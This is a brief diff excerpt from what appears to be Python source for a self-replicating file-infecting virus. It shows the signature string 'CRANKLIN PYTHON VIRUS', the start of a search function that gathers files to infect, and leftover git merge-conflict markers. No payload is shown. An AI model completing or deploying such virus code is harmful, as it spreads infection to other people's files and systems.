@@ -3,7 +3,10 @@ import datetime
 import random, array
 
 SIGNATURE = "CRANKLIN PYTHON VIRUS"
+<<<<<<< HEAD
 
+=======
+>>>>>>> origin/master
 def search(path):
     filestoinfect = []
     filelist = os.listdir(path)
